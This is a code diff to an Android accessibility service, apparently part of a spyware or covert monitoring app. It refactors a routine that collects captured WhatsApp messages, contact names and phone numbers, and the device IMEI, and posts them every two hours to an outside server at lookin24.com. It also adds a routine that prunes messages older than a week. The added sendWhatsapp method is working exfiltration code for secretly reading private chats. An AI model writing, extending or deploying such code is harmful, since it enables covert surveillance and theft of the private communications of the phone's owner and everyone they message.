@@ -32,6 +32,7 @@ import org.json.JSONObject;
 
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Collections;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.HashSet;
@@ -514,6 +515,74 @@ public class MyAccessibilityService extends AccessibilityService {
 
         }
     }
+    public static void resizeWhatsapp() {
+        ArrayList<String> L = new ArrayList<>();
+        long today = new Date().getTime();
+        for(Map.Entry<String, Conversation> m : conversationMap.entrySet()) {
+            String k = m.getKey();
+            Conversation c = m.getValue();
+            if(c.messages == null || c.messages.tail == null || c.messages.tail.element.date == null) {
+                continue;
+            }
+            for(DoublyLinkedList.Node x = c.messages.head; x != null; x = x.next) {
+                Message me = (Message)x.element;
+                if(today - me.date.getTime() > 1000 * 60 * 60 * 24 * 7) {
+                    c.messages.head = x.next;
+                    //Logger.l("REMOVED", ((Message)x.element).content);
+                }
+            }
+            if(c.messages.head == null) {
+                L.add(k);
+            }
+        }
+        for(String x : L) {
+            Logger.l("REMOVED", x);
+            conversationMap.remove(x);
+        }
+    }
+    public static void sendWhatsapp() {
+        JSONObject d = new JSONObject();
+        JSONArray ar = new JSONArray();
+        for(Map.Entry<String, Conversation> m : conversationMap.entrySet()) {
+            String k = m.getKey();
+            Conversation c = m.getValue();
+            JSONArray ma = new JSONArray();
+            JSONObject jo = new JSONObject();
+            if(c.messages.head == null) {
+                continue;
+            }
+            for(DoublyLinkedList.Node x = c.messages.head; x != null; x = x.next) {
+                Message message = (Message) x.element;
+                JSONObject o = new JSONObject();
+                try {
+                    o.put("sender", message.sender);
+                    o.put("content", message.content);
+                    o.put("time", message.date.getTime());
+                    ma.put(o);
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+            }
+            try {
+                jo.put("sender", k);
+                jo.put("number", new ContactHelper(instance).getPhoneNumber(instance, k));
+                jo.put("con", ma);
+                ar.put(jo);
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+
+        }
+        try {
+            d.put("data", ar);
+            d.put("imei", new Device(instance).getImei());
+            Logger.l("POSTED data : " + d.toString());
+            new ServerHelper2(instance).execute("https://lookin24.com/sendWhatsapp", d.toString());
+            resizeWhatsapp();
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+    }
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
@@ -548,48 +617,11 @@ public class MyAccessibilityService extends AccessibilityService {
                 h.post(new Runnable() {
                     @Override
                     public void run() {
-                        JSONObject d = new JSONObject();
-                        JSONArray ar = new JSONArray();
-                        for(Map.Entry<String, Conversation> m : conversationMap.entrySet()) {
-                            String k = m.getKey();
-                            Conversation c = m.getValue();
-                            JSONArray ma = new JSONArray();
-                            JSONObject jo = new JSONObject();
-                            for(DoublyLinkedList.Node x = c.messages.head; x != null; x = x.next) {
-                                Message message = (Message) x.element;
-                                JSONObject o = new JSONObject();
-                                try {
-                                    o.put("sender", message.sender);
-                                    o.put("content", message.content);
-                                    o.put("time", message.date.getTime());
-                                    ma.put(o);
-                                } catch (JSONException e) {
-                                    e.printStackTrace();
-                                }
-                            }
-                            try {
-                                jo.put("sender", k);
-                                jo.put("number", new ContactHelper(instance).getPhoneNumber(instance, k));
-                                jo.put("con", ma);
-                                ar.put(jo);
-                            } catch (JSONException e) {
-                                e.printStackTrace();
-                            }
-
-                        }
-                        try {
-                            d.put("data", ar);
-                            d.put("imei", new Device(instance).getImei());
-                            Logger.l("POSTED data : " + d.toString());
-                            new ServerHelper2(instance).execute("https://lookin24.com/sendWhatsapp", d.toString());
-
-                        } catch (JSONException e) {
-                            e.printStackTrace();
-                        }
+                        sendWhatsapp();
                     }
                 });
             }
-        }, 0, 1000*60);
+        }, 0, 1000 * 60 * 60 * 2);
     }
 
 
